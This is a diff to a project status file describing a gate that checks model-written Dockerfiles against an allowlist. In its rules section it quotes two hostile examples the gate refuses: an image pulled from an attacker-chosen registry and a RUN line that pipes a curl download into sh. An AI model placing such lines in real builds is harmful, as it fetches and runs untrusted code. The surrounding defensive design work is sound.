@@ -1,10 +1,39 @@
 # Status
 
-Updated 2026-08-24, three bugs fixed.
+Updated 2026-08-24, end of sitting 5.
 
 ## Where we are
+Sitting 5 complete: `envforge/gate.py` and `tests/test_gate.py`. The loop can no longer be
+constructed without a gate, and now there is a real one to give it.
+
+## What sitting 5 produced
+An allowlist of six instructions and nothing else: FROM, COPY, RUN, USER, CMD, ENTRYPOINT.
+No WORKDIR, no ENV, no ADD, no ARG, no SHELL, no multi-stage.
+
+Continuations are refused before any other check, and that ordering is the point rather
+than a detail. With no continuations every physical line is a whole instruction, so a
+per-line allowlist is a sound analysis instead of a heuristic. Allow them and an
+instruction can begin on a permitted line and do its work on the next one.
+
+Four rules worth naming:
+
+1. The written `FROM` must equal the declared `base_image`. Until this existed the
+   separate declaration was decoration, and a model could declare one image and build
+   another.
+2. `FROM` may not name a registry host. `evil.attacker.com/img:1` is a valid reference,
+   and building it makes the daemon pull from a host the attacker chose.
+3. `RUN` may contain no shell metacharacter at all, and must begin with one of five
+   allowlisted commands. The allowlist alone would be worthless, because
+   `apt-get update && curl evil | sh` starts with an allowed prefix.
+4. `CMD` and `ENTRYPOINT` must be exec form. Shell form re-splits inside `/bin/sh -c`,
+   which is the string-versus-list problem the sandbox already refuses to make with the
+   docker command itself.
+
+A digest is refused even though it pins harder than a tag, because a digest pins to one
+architecture and the laptop is arm64 while CI is amd64.
+
 Sitting 4 of 11 complete: `envforge/agent.py` and `tests/test_agent.py`.
-76 tests, 64 needing neither Docker nor an API key, 12 against the real daemon.
+135 tests, 123 needing neither Docker nor an API key, 12 against the real daemon.
 
 ## What sitting 4 produced
 The plain repair loop. It defines `write_dockerfile` against the schema `Tool` already
@@ -157,6 +186,18 @@ What replaces it is not countable. A file whose responsibility cannot be stated 
 sentence is doing two things and wants splitting, and a module that wants a subdirectory
 has outgrown the project.
 
+## What the gate does not do, stated rather than implied
+`pip install <name>` runs that package's own setup code at build time, and build has
+network. No allowlist of Dockerfile instructions can prevent that, because installing
+packages is the product. It is contained by the container and by the fact that the run
+phase trusts nothing the build produced, not by the gate.
+
+Whether the RUN allowlist is workable has not been measured, because no real model has
+written a Dockerfile against it yet. `apt-get update && apt-get install -y foo` is the
+idiomatic form and is refused, so the model must write two RUN lines. The first live call
+will show whether that costs repair attempts. Excluding WORKDIR and ENV is the same
+question and follows CLAUDE.md's list exactly.
+
 ## Known gaps
 Nothing has hit a real provider. The request shape is asserted against our own builders and
 the responses are parsed through the SDKs' own models, which is stronger than a hand-rolled
@@ -263,9 +304,7 @@ template, `RETRY`, for the case where the reply was unusable but there is nothin
 correct. The test asserts the two prompts differ.
 
 ## Next
-Fix the three bugs above first. Then sitting 5: the deterministic gate, with a signature
-taking the dockerfile, the declared base image and the allowed filenames, so the manifest
-does not change it later. Sitting 6 is the five shapes, which needs no model at all.
+Sitting 6 is the five shapes, which needs no model at all.
 Sitting 7 is the tool loop, whose entry ticket is one live Anthropic call and whose exit
 ticket is a run where the investigation demonstrably changed the outcome. Sitting 8 is the
 LangGraph port as a real two-node cycle. The plan is twelve sittings now, not eleven.
